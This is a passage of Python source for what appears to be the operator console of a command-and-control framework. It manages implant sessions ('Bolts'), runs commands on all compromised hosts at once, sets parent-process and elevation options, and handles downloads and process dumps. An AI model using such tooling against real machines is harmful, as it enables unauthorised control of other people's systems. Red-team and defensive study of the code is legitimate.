            rollback 0 # Rollback to the start
        """
        p = None
        if nes(n):
            try:
                p = int(n)
            except ValueError:
                return print("rollback [number]")
        try:
            r = self.shell.cirrus.script_rollback(self.name, p)
        except ValueError as err:
            return print(f"[!] {err}!")
        del p
        print(f'[+] Rolled Script "{self.name}" to "{r["rollbacks"]}".')
        self._set_prompt(r)
        del r

    def do_parent_pid(self, v, line=None):
        if not super(__class__, self).do_parent_pid(v):
            return
        self._add_note(line)

    def do_parent_name(self, v, line=None):
        if not super(__class__, self).do_parent_name(v):
            return
        self._add_note(line)

    def do_download(self, f, p, line=None):
        if nes(p):
            print(f'The value "{p}" will not be parsed.')
        self._do_exec(super(__class__, self).do_download, [f, None], line)

    def _get_set_setting(self, n, a, p, v):
        if not nes(v):
            try:
                r = self.shell.cirrus.script(self.name)
                if r is None or a not in r:
                    print(f"{n}: False")
                else:
                    print(f"{n}: {str(r[a]).title()}")
                del r
            except ValueError as err:
                print(f"[!] {err}!")
            return
        b = is_true(v)
        try:
            self.shell.cirrus.script_update(self.name, **{p: b})
        except ValueError as err:
            return print(f"[!] {err}!")
        print(f"[+] Set {n}: {str(b).title()}")
        del b

    def do_parent_clear(self, _, line=None):
        if not super(__class__, self).do_parent_clear(_):
            return
        self._add_note(line)

    def do_return_output(self, v, line=None):
        """
        return_output [boolean]

        The return_output command can be used to get or set the "return_output"
        value of this script, which specifies if command output is returned once
        the script completes.

        To get the current setting, use "return_output" without any arguments.
        To set the setting, any boolean value or boolean-ish value may be used to
        set the value.

        Examples:
            return_output
            return_output false
            return_output yes
        """
        self._get_set_setting("Return Output", "return_output", "output", v)

    def do_stop_on_error(self, v, line=None):
        """
        stop_on_error [boolean]

        The stop_on_error command can be used to get or set the "stop_on_error"
        value of this script, which specifies if the script should continue execution
        if one of it's commands errors out.

        To get the current setting, use "stop_on_error" without any arguments.
        To set the setting, any boolean value or boolean-ish value may be used to
        set the value.

        Examples:
            stop_on_error
            stop_on_error false
            stop_on_error yes
        """
        self._get_set_setting("Stop on Error", "stop_on_error", "stop_on_error", v)

    def do_parent_desktop(self, v, line=None):
        if not super(__class__, self).do_parent_desktop(v):
            return
        self._add_note(line)

    def do_parent_include(self, v, line=None):
        if not super(__class__, self).do_parent_include(v):
            return
        self._add_note(line)

    def do_parent_exclude(self, v, line=None):
        if not super(__class__, self).do_parent_exclude(v):
            return
        self._add_note(line)

    def do_parent_elevated(self, v, line=None):
        if not super(__class__, self).do_parent_elevated(v):
            return
        self._add_note(line)

    def do_parent_fallback(self, v, line=None):
        if not super(__class__, self).do_parent_fallback(v):
            return
        self._add_note(line)

    def _system(self, c, filter=None, out=None):
        if nes(out):
            print(f'The value "{out}" will not be parsed.')
        return super(__class__, self)._system(c, filter, None)


class _MenuBoltAll(_MenuBolt):
    __slots__ = ("results", "matcher")

    _MENU = ["display", "nodisplay"] + _MenuBolt._MENU
    _PROMPT = """This is the ALL Bolts shell.
Each command will be ran on each Bolt (or every bolt in the supplied filter).

Use the "display" and "nodisplay" commands to change output control of commands
completed.

Note that commands that specify an output file (download, screenshot, procdump)
will ignore the output file argument and will use a generated one instead.
"""

    def __init__(self, shell):
        _MenuBolt.__init__(self, shell)
        self.results = True
        self.matcher = None

    def do_chan(self, _):
        print("Not available inside ALL Bolts.")

    def do_info(self, _):
        print("Not available inside ALL Bolts.")

    def do_jobs(self, _):
        print("Not available inside ALL Bolts.")

    def do_last(self, _):
        print("Not available inside ALL Bolts")

    def do_display(self, n):
        if len(n) == 0:
            return print(
                f'[+] Command Output is {"enabled" if self.results else "disabled"}.'
            )
        self.results = is_true(n)
        print(f'[+] Set Command Output to "{self.results}".')

    def _exec(self, f, **a):
        if not isinstance(a, dict):
            a = dict()
        try:
            if self.matcher is None:
                # NOTE(dij): Matcher is empty, use cache.
                for v in self.shell.cache.bolts(None):
                    f(v, **a)
                return
            for v in self.matcher.matches(self.shell.cirrus.sessions()):
                f(v["id"], **a)
        except (ValueError, TypeError) as err:
            print(f"[!] {err}!")

    def do_nodisplay(self, _):
        if not self.results:
            return
        self.results = False
        print('[+] Set Command Output to "False".')

    def do_download(self, p, f):
        if nes(f):
            print(f'The value "{f}" will not be parsed.')
        super(__class__, self).do_download(p, None)

    def prompt(self, args=None):
        if not nes(args):
            self.matcher = None
        else:
            self.matcher = Exp.parse(args)
        print(_MenuBoltAll._PROMPT)
        print("Default execution is ", end="")
        if self.shell.no_default_run:
            print('disabled. Execution can only occur with "run", "shell" or "pwsh".')
        else:
            print("enabled.")
        self.filter = None
        self.results = True
        if self.matcher is None or self.matcher.empty():
            return " > Bolts > [ALL] > "
        s = self.matcher.matches(self.shell.cirrus.sessions())
        if len(s) == 0:
            print(f'[!] The matcher "{self.matcher}", does not match any Bolt(s)\n')
            return f" > Bolts > [{self.matcher}] > "
        print(f'The matcher "{self.matcher}", matches the following Bolt(s):')
        print(f'{"ID":9}{"Hostname":20}{"IP":17}{"OS":10}{"User":32}\n{"="*80}')
        for v in s:
            print(f'{v["id"]:9}', end="")
            u = ""
            if v["device"]["elevated"]:
                u = "*"
            u = u + v["device"]["user"]
            if len(u) > 30:
                u = u[:30] + "~"
            if v["device"]["domain"]:
                u = u + "@"
            h = v["device"]["hostname"]
            if len(h) > 19 and "." in h:
                h = h.split(".")[0]
            if len(h) > 19:
                h = h[:19] + "~"
            print(f'{h:20}{ip_str(v):17}{v["device"]["os"]:10}{u:32}')
            del u, h
        del s
        print()
        return f" > Bolts > [{self.matcher}] > "

    def completenames(self, n, *_):
        return _menu(n, _MenuBoltAll._MENU)

    def _system(self, c, filter=None, out=None):
        if nes(out):
            print(f'The value "{out}" will not be parsed.')
        return super(__class__, self)._system(c, filter, None)


class Shell(Cmd):
    __slots__ = (
        "dll",
        "asm",
        "pipe",
        "cache",
        "_init",
        "_state",
        "cirrus",
        "_module",
        "_old_delims",
        "no_default_run",
    )

    def __init__(self, cirrus, no_default_run=False, pipe=None, asm=None, dll=None):
        Cmd.__init__(self, stdin=stdin, stdout=stdout, completekey="tab")
        self.asm = asm
        self.dll = dll
        self._state = 0
        self.pipe = pipe
        self._init = False
        self.cirrus = cirrus
        self._old_delims = None
        self.cache = _Cache(cirrus)
        self.no_default_run = no_default_run
        self._module = import_module(__name__)
        self.set_menu(0)

    def enter(self):
        self.init()
        try:
            self.cmdloop(
                'Welcome to the Doppler  interface. Use "help" to display the command guide.\n'
                "Happy hacking!"
            )
        except KeyboardInterrupt:
            print()
        except Exception as err:
            print(
                f"\n[!] {err.__class__.__name__} {err}\n{format_exc(5)}",
                file=stderr,
            )
        self.close()

    def close(self):
        h = expandvars(expanduser(HISTORY_FILE))
        if h != devnull:
            try:
                write_history_file(h)
            except OSError:
                pass
        del h
        self.cirrus.close()

    def _on_main(self):
        return self._menu is None or isinstance(self._menu, _MenuMain)

    def _backable(self):
        return (
            not self._on_main()
            and hasattr(self._menu, "quick_back")
            and self._menu.quick_back
        )

    def onecmd(self, n):
        self.run_cmd(n, True, True, True, True)

    def emptyline(self):
        return None

    def do_exit(self, _):
        raise EOFError()

    def do_help(self, _):
        if self._state > len(HELP_TEXT):
            return
        print(HELP_TEXT[self._state])

    def default(self, cmd):
        return None

    def init(self, single=False):
        if self._init:
            return
        try:
            if single:
                self.cirrus.start(False)
            else:
                self.cirrus.start(True, events=self._on_event)
        except (KeyboardInterrupt, ValueError) as err:
            self.cirrus.close()
            raise err
        except Exception as err:
            self.cirrus.close()
            return print(
                f"\n[!] {err.__class__.__name__} {err}\n{format_exc(4)}",
                file=stderr,
            )
        if single:
            self._init = True
            return
        h = expandvars(expanduser(HISTORY_FILE))
        if h != devnull:
            try:
                read_history_file(h)
            except (OSError, ValueError):
                pass
        del h
        set_history_length(400)
        if not self.cirrus.alive():
            print(
                "[!] WARNING Eventer is not active, Cirrus may be down or not reachable.."
            )
        self._init = True

    def complete(self, text, s):
        if s == 0:
            v = get_line_buffer()
            o = v.lstrip()
            i = len(v) - len(o)
            del v
            x = get_begidx() - i
            e = get_endidx() - i
            del i
            if x <= 0:
                f = self._complete_func(x, "")
            else:
                c, _, _ = self.parseline(o)
                f = self._complete_func(x, c)
                del c
            self.completion_matches = f(text, o, x, e)
            del f, o, x, e
        try:
            return self.completion_matches[s]
        except IndexError:
            return None

    def completedefault(self, *_):
        return _EMPTY

    def cmdloop(self, intro=None):
        self.preloop()
        if self.completekey:
            self.old_completer = get_completer()
            set_completer(self.complete)
            parse_and_bind(self.completekey + ": complete")
        self._old_delims = get_completer_delims()
        set_completer_delims(self._old_delims.replace("-", "", 1))
        try:
            if intro is not None:
                self.intro = intro
            if self.intro and self._state == 0:
                self.stdout.write(str(self.intro) + "\n")
            s, o = None, False
            while not s:
                try:
                    if self.cmdqueue:
                        n = self.cmdqueue.pop(0)
                    else:
                        n, o = input(self.prompt), False
                    n = n.strip()
                    s = self.postcmd(self.onecmd(n), self.precmd(n))
                    del n
                except EOFError:
                    print()
                    break
                except KeyboardInterrupt as err:
                    print()
                    if nes(get_line_buffer()):
                        o = False
                        continue
                    if not self._on_main():
                        if not hasattr(self._menu, "do_back"):
                            self.set_menu(MENU_MAIN)
                            continue
                        self._menu.do_back(None)
                        continue
                    if o:
                        raise err
                    o = True
                    print(
                        'Ctrl-C pressed. (Press Ctrl-C again, type "exit" or press Ctrl-D to exit)',
                        file=self.stdout,
                    )
            del s, o
            self.postloop()
        finally:
            if self.completekey:
                set_completer(self.old_completer)
            set_completer_delims(self._old_delims)

    def _complete_func(self, b, cmd):
        if b <= 0:
            if self._menu is None:
                return self.completenames
            try:
                f = getattr(self._menu, "completenames")
                if callable(f):
                    return f
                del f
            except AttributeError:
                pass
            return self.completenames
        if len(cmd) > 0 and self._menu is not None:
            try:
                f = getattr(self._menu, "complete_" + cmd)
                if callable(f):
                    return f
                del f
            except AttributeError:
                pass
            try:
                f = getattr(self._menu, "completedefault")
                if callable(f):
                    return f
                del f
            except AttributeError:
                pass
        elif self._menu is not None:
            try:
                f = getattr(self._menu, "completedefault")
                if callable(f):
                    return f
                del f
            except AttributeError:
                pass
        try:
            f = getattr(self, "complete_" + cmd)
            if callable(f):
                return f
            del f
        except AttributeError:
            pass
        return self.completedefault

    def set_menu(self, index, args=None):
        m = MENUS[index]
        if m[1] is None:
            m[1] = getattr(self._module, m[0])(self)
        self._menu, self._state = m[1], index
        self.prompt = self._menu.prompt(args)
        del m

    def _on_event(self, a, id, msg, job):
        if a == "job_new" or a == "job_delete":
            if self.cache._jobs is not None and id in self.cache._jobs:
                del self.cache._jobs[id]
            return
        if a == "profile_new" or a == "profile_delete" or a == "profile_update":
            self.cache._profiles = None
            return
        if a == "listener_new" or a == "listener_update" or a == "listener_delete":
            self.cache._listeners = None
            return
        if a == "session_new":
            if self._state != MENU_BOLT:
                try:
                    s = self.cirrus.session(id)
                    print(
                        f"\nNew Bolt Registered: {id} "
                        f'{("*" if s["device"]["elevated"] else "") + s["device"]["user"]}'
                        f" @ {ip_str(s)}"
                    )
                    del s
                except ValueError:
                    print(f"\n[*] {msg}", end="")
            self.cache._bolts = None
            if self.cache._jobs is not None and id in self.cache._jobs:
                del self.cache._jobs[id]
            return
        if a == "session_delete":
            if self._state == MENU_BOLT and self._menu.id == id:
                print(f"\n[*] {id}: This Bolt was removed or shutdown.")
            self.cache._bolts, self.cache._jobs = None, None
            return
        if self._state == MENU_BOLT:
            if self._menu.id != id:  # getattr(self._menu, "id") != id:
                return
            if a == "job_receiving" or a == "job_update" or a == "session_update":
                return print(f"\n[*] {msg}")
            if a == "job_complete":
                self.cirrus.job_display(id, job, True)
            return
        # NOTE(dij): Disabeling for now as it can get spammy.
        if a == "packet_new" and self._state != MENU_BOLT_ALL:
            return print(f"\n[*] {msg}")
        if self._state != MENU_BOLT_ALL:
            return
        if a == "job_receiving" or a == "job_update" or a == "session_update":
            return print(f"\n[*] {msg}")
        if a == "job_complete" and self._menu.results:
            return self.cirrus.job_display(id, job, True, True)

    def run_cmd(self, n, can_back, can_main, can_run, can_hist):
        c, a, n = self.parseline(n)
        if not nes(n):
            return self.emptyline()
        if c is None:
            if len(n) > 1 and n[0] == "!":
                if not can_run:
                    return print("[!] Not allowed to run commands!")
                return _run_print_stdout(n[1:])
            if can_back and self._backable():
                if hasattr(self._menu, "do_back"):
                    return self._menu.do_back(None)
                return self.set_menu(MENU_MAIN)
            if not self._on_main():
                try:
                    return self._menu.default(n)
                except AttributeError:
                    pass
            return self.default(n)
        if c == "":
            if len(n) == 1 and n[0] == "@":
                if not can_hist:
                    return print("[!] Not allowed to run history commands!")
                for x in range(1, get_history_length()):
                    v = get_history_item(x)
                    if v is None:
                        continue
                    print(f"{x:3}: {v}")
                    del v
                return
            if len(n) == 6 and n == "@clear":
                if not can_hist:
                    return print("[!] Not allowed to run history commands!")
                return clear_history()
            if len(n) > 1 and n[0] == "@":
                if not can_hist:
                    return print("[!] Not allowed to run history commands!")
                try:
                    v = int(n[1:])
                except ValueError:
                    y = n[1:].lower()
                    for x in range(1, get_history_length()):
                        u = get_history_item(x)
                        if u is None or (nes(u) and not u.lower().startswith(y)):
                            continue
                        print(f"{x:3}: {u}")
                    del y
                    return
                try:
                    x = get_history_item(v)
                except IndexError:
                    return print("[!] Non-existant history index!")
                if not nes(x):
                    return print("[!] Invalid history index!")
                if x[0] == "@" or x[0] == "!":
                    return
                del v
                print(f"Running: {x}")
                add_history(x)
                return self.run_cmd(x, True, True, False, False)
            if a == ".." and can_back and self._backable():
                if not hasattr(self._menu, "do_back"):
                    return self.set_menu(MENU_MAIN)
                return self._menu.do_back(None)
            if a == "\\" and can_main and self._backable():
                return self.set_menu(MENU_MAIN)
            if self._menu is not None:
                try:
                    return self._menu.default(n)
                except AttributeError:
                    pass
            return self.default(n)
        if (
            c == "main"
            and can_main
            and not self._on_main()
            and not hasattr(self._menu, "do_main")
        ):
            return self.set_menu(MENU_MAIN)
        if (
            c == "back"
            and can_back
            and not self._on_main()
            and not hasattr(self._menu, "do_back")
        ):
            return self.set_menu(MENU_MAIN)
        if c == "exit" and can_main and not hasattr(self._menu, "do_exit"):
            return self.do_exit(None)
        if c == "help" and not hasattr(self._menu, "do_help"):
            return self.do_help(None)
        if n == "EOF":
            self.lastcmd = ""
        else:
            self.lastcmd = n
        try:
            if self._menu is not None:
                f = getattr(self._menu, "do_" + c)
            else:
                f = getattr(self, "do_" + c)
        except AttributeError:
            if self._menu is not None:
                try:
                    return self._menu.default(n)
                except AttributeError:
                    pass
            return self.default(n)
        y = False
        if self._menu is not None:
            try:
                y = getattr(self._menu, "show_line") is not None
            except AttributeError:
                y = False
        if y and self._menu is not None:
            try:
                u, k = getattr(self._menu, "arg_count"), None
                if callable(u):
                    k = u("do_" + c)
                if k is None:
                    k = f.__code__.co_argcount
                del u
            except AttributeError:
                k = f.__code__.co_argcount
        else:
            k = f.__code__.co_argcount
        del c
        if k == 1:
            try:
                v = _shell_split(a)
            except ValueError:
                if y:
                    return f(a, line=n)
                return f(a)
            if y:
                return f(*v, line=n)
            return f(*v)
        if k <= 2:
            if y:
                return f(a, line=n)
            return f(a)
        try:
            v = _shell_split(a)
        except ValueError:
            if y:
                return f(a, line=n)
            return f(a)
        if len(v) == k - 1:
            if y:
                return f(*v, line=n)
            return f(*v)
        i = [None] * (k - 1)
        for x in range(0, len(v)):
            if x >= len(i) or x >= len(v):
                break
            i[x] = v[x]
        if len(v) > len(i):
            i[-1] = " ".join(v[len(i) - 1 :])
        del v
        if y:
            return f(*i, line=n)
        return f(*i)
